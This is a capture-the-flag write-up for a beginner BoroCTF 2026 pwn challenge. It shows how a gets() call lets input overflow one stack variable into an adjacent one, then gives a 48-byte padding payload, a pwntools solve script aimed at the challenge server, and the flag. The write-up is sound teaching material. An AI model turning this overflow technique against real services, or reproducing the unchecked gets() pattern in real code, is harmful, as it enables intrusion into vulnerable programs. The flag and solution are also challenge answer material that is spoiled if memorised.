# BoroCTF 2026 - Two words, One problem (PWN)

## Challenge Information

**Category:** PWN
**Points:** 200
**Solves:** 185

### Description

> The first time pwn solves problems.

Service:

```bash
nc 1xgu8bd1niap.boroctf.com 34069
```

---

# Initial Analysis

After extracting the provided files, we find a simple C program containing two stack variables:

```c
char non_constant[37] = "I love";
const char constant[37] = "barackCTF";
```

The program displays a menu:

```text
[1] - Read values
[2] - Write value
```

The interesting functionality is inside the write option:

```c
void change(char *nc)
{
    gets(nc);
}
```

Immediately, the use of `gets()` stands out because it performs **no bounds checking**, making it vulnerable to a classic stack buffer overflow.

---

# Vulnerability

The variable passed to `gets()` is:

```c
char non_constant[37]
```

Since `gets()` keeps reading until a newline is encountered, we can write beyond the end of `non_constant` and overwrite adjacent stack data.

Using Ghidra, we observe:

```text
non_constant -> rbp-0x90
constant     -> rbp-0x60
```

Distance:

```text
0x90 - 0x60 = 0x30
```

Which equals:

```text
48 bytes
```

Therefore, writing 48 bytes allows us to reach the beginning of `constant`.

---

# Goal

Later, the program checks:

```c
if (strcmp(c, "boroCTF") == 0)
{
    print_flag();
}
```

Initially:

```c
constant = "barackCTF"
```

Our objective is to overwrite it with:

```text
boroCTF
```

---

# Exploitation

Payload:

```python
b"A"*48 + b"boroCTF"
```

The first 48 bytes fill the gap between the two stack variables.

The next bytes overwrite:

```c
constant = "barackCTF"
```

with

```c
constant = "boroCTF"
```

When option 1 is selected, the program executes:

```c
strcmp(c, "boroCTF")
```

which now succeeds and reveals the flag.

---

# Solve Script

```python
from pwn import *

io = remote("1xgu8bd1niap.boroctf.com", 34069)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", b"A"*48 + b"boroCTF")

io.sendlineafter(b"> ", b"1")

io.interactive()
```

---

# Flag

```text
boroCTF{I_c@n_7ix_tH%s}
```

---

# Takeaway

This challenge demonstrates a classic stack overflow caused by the unsafe `gets()` function.

Key observations:

* `gets()` allows arbitrary-length input.
* Adjacent stack variables can be overwritten.
* Understanding stack layout is often enough to solve beginner pwn challenges.
* No shellcode or ROP was required; a simple variable overwrite was sufficient.

A perfect introductory challenge for learning memory corruption and stack-based overflows.

